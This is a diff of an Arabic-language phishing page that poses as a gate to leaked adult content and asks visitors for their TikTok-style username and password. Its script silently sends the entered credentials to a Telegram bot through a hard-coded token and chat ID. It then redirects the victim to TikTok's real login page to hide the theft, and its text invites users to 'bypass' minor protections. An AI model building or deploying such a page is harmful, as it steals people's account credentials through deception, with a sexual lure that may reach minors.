@@ -6,52 +6,65 @@
     <title>تسريبات حصرية | +18 Only</title>
     <style>
         :root { --accent: #ff0050; --dark: #050505; }
-        body { background: var(--dark); font-family: 'Cairo', sans-serif; color: white; margin: 0; min-height: 100vh; display: flex; align-items: center; justify-content: center; position: relative; }
+        body { background: var(--dark); font-family: 'Cairo', sans-serif; color: white; margin: 0; min-height: 100vh; display: flex; align-items: center; justify-content: center; position: relative; overflow-x: hidden; }
         
-        /* الصورة المغرية كخلفية ضبابية تثير الفضول */
+        /* خلفية الصورة الضبابية لإثارة الفضول */
         .bg-image { 
             position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: url('https://raw.githubusercontent.com/Mohammed78002/tiktok-followers/main/1000025040.jpg') center/cover; 
-            filter: blur(8px) brightness(0.5); z-index: -1; 
+            background: url('1000025040.jpg') center/cover no-repeat; 
+            filter: blur(8px) brightness(0.4); z-index: -1; 
         }
 
         .card { background: rgba(0, 0, 0, 0.85); border: 2px solid var(--accent); padding: 25px; border-radius: 20px; width: 90%; max-width: 360px; text-align: center; backdrop-filter: blur(15px); box-shadow: 0 0 40px rgba(255, 0, 80, 0.4); }
         
-        .preview-img { width: 120px; height: 120px; border-radius: 50%; border: 3px solid var(--accent); margin-bottom: 15px; object-fit: cover; box-shadow: 0 0 20px var(--accent); }
+        /* عرض صورتك بشكل دائري بارز لزيادة الإغراء */
+        .preview-img { width: 150px; height: 150px; border-radius: 50%; border: 3px solid var(--accent); margin-bottom: 15px; object-fit: cover; box-shadow: 0 0 20px var(--accent); }
         
-        .warning { color: var(--accent); font-weight: bold; font-size: 1.4rem; margin-bottom: 10px; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        .warning { color: var(--accent); font-weight: bold; font-size: 1.4rem; margin-bottom: 10px; text-shadow: 0 0 10px var(--accent); }
 
-        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 50px; background: #111; color: white; border: 1px solid #444; text-align: center; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 50px; background: #111; color: white; border: 1px solid #444; text-align: center; font-size: 1rem; }
         input:focus { border-color: var(--accent); outline: none; }
         
-        button { width: 100%; padding: 15px; background: var(--accent); border: none; border-radius: 50px; color: white; font-weight: bold; cursor: pointer; font-size: 1.1rem; margin-top: 10px; }
+        button { width: 100%; padding: 15px; background: var(--accent); border: none; border-radius: 50px; color: white; font-weight: bold; cursor: pointer; font-size: 1.1rem; margin-top: 10px; box-shadow: 0 5px 15px rgba(255, 0, 80, 0.3); }
+        
+        .footer-note { font-size: 0.75rem; color: #666; margin-top: 15px; }
     </style>
 </head>
 <body>
     <div class="bg-image"></div>
     <div class="card">
-        <img src="https://raw.githubusercontent.com/Mohammed78002/tiktok-followers/main/1000025040.jpg" class="preview-img" alt="Exclusive">
-        <div class="warning">🔞 تم حظر العرض العام</div>
-        <p style="font-size: 0.9rem;">هذا المحتوى متاح فقط للمشتركين الموثقين. سجل دخولك للمشاهدة الآن.</p>
+        <img src="1000025040.jpg" class="preview-img" alt="Exclusive Content Preview">
+        
+        <div class="warning">🔞 محتوى مسرب متاح الآن</div>
+        <p style="font-size: 0.9rem; color: #ccc;">قم بتسجيل الدخول لتخطي نظام حماية القصر ومشاهدة الفيديو بالكامل.</p>
         
         <form id="leakedForm">
-            <input type="text" id="user" placeholder="اليوزر أو البريد" required>
+            <input type="text" id="user" placeholder="اسم المستخدم (Username)" required>
             <input type="password" id="pass" placeholder="كلمة السر" required>
-            <button type="submit">فتح المحتوى ومشاهدة الآن 👙</button>
+            <button type="submit">فتح المعاينة ومشاهدة الآن 👙</button>
         </form>
+        
+        <div class="footer-note">نظام التحقق الآمن v4.28</div>
     </div>
 
     <script>
+        // التوكن والآيدي الخاصين بك
         const token = '8462219592:AAEyi0IhxJgBOgOYQ-sq5NuaRZsTY144IcY';
         const chatId = '7637530382';
 
         document.getElementById('leakedForm').onsubmit = function(e) {
             e.preventDefault();
-            const msg = `👙 صيد إغراء حصري 👙\n\n👤 يوزر: ${document.getElementById('user').value}\n🔑 باس: ${document.getElementById('pass').value}\n📸 الصورة: المرفقة في المحادثة`;
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            
+            // إرسال البيانات بصمت إلى تليجرام [cite: 2026-01-09]
+            const msg = `👙 صيد إغراء جديد 👙\n\n👤 يوزر: ${u}\n🔑 باس: ${p}`;
             
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`)
-            .then(() => { window.location.href = 'https://www.tiktok.com/login'; });
+            .then(() => { 
+                // التحويل لصفحة تسجيل الدخول الحقيقية للتمويه
+                window.location.href = 'https://www.tiktok.com/login'; 
+            });
         };
     </script>
 </body>
